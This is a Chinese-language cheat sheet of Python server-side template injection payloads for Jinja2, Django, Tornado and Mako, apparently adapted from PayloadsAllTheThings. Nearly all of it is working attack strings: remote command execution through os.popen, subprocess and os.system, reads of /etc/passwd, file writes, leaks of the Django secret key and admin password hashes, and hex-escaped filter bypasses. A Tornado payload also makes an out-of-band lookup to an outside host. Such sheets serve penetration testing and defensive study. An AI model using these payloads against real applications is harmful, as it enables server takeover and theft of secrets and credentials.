# SSTI Python - Python服务端模板注入

[SEARCH_KEYWORDS]
漏洞类型: SSTI Server-Side Template Injection 服务端模板注入
攻击类型: Remote Code Execution File Read/Write Information Disclosure
关键词: SSTI Jinja2 Django Flask Tornado Mako template injection
技术: MRO __class__ __subclasses__ __globals__ __builtins__ os.popen
框架: Jinja2 Django Tornado Mako Bottle Chameleon Cheetah
函数: config lipsum cycler joiner namespace

[CONTENT]

## SSTI Python概述

服务端模板注入(SSTI)是一种漏洞，攻击者可在服务端模板中注入恶意输入，导致服务器执行任意代码。Python中SSTI可发生在Jinja2、Mako、Django模板等模板引擎。

## 模板库Payload格式

| 模板名 | Payload格式 |
|--------|-------------|
| Bottle | `{{ }}` |
| Chameleon | `${ }` |
| Cheetah | `${ }` |
| Django | `{{ }}` |
| Jinja2 | `{{ }}` |
| Mako | `${ }` |
| Pystache | `{{ }}` |
| Tornado | `{{ }}` |

## Django模板注入

### 基本注入

```python
{% csrf_token %}   # Jinja2会报错
{{ 7*7 }}          # Django Templates会报错
ih0vr{{364|add:733}}d121r  # Burp Payload -> ih0vr1097d121r
```

### XSS

```python
{{ '<script>alert(3)</script>' }}
{{ '<script>alert(3)</script>' | safe }}
```

### 调试信息泄露

```python
{% debug %}
```

### 泄露Secret Key

```python
{{ messages.storages.0.signer.key }}
```

### 泄露Admin URL

```python
{% include 'admin/base.html' %}
```

### 泄露Admin密码哈希

```python
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
{{e.user.get_username}} : {{e.user.password}}{% endfor %}
```

## Jinja2模板注入

### 基本注入

```python
{{4*4}}[[5*5]]
{{7*'7'}}           # 结果: 7777777
{{config.items()}}
```

### 调试语句

```python
<pre>{% debug %}</pre>
```

### 获取所有类

```python
{{ [].__class__.__base__.__subclasses__() }}
{{''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

### 获取Config

```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

### 读取文件

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### 写入文件

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

### 命令执行

```python
# 使用os.popen
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# 无需builtins
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# 最短Payload
{{ lipsum.__globals__["os"].popen('id').read() }}

# 使用subprocess
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
```

### 无需猜测偏移的RCE

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
```

### Filter绕过

```python
# 绕过下划线
{{request|attr(["__","class","__"]|join)}}
{{request|attr("\x5f\x5fclass\x5f\x5f")}}

# 绕过多个过滤器
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

## Tornado模板注入

```python
{{7*7}}
{{7*'7'}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

## Mako模板注入

```python
<%
import os
x=os.popen('id').read()
%>
${x}

# 直接RCE
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
```

## 参考文档

原始来源: PayloadsAllTheThings/Server Side Template Injection/Python.md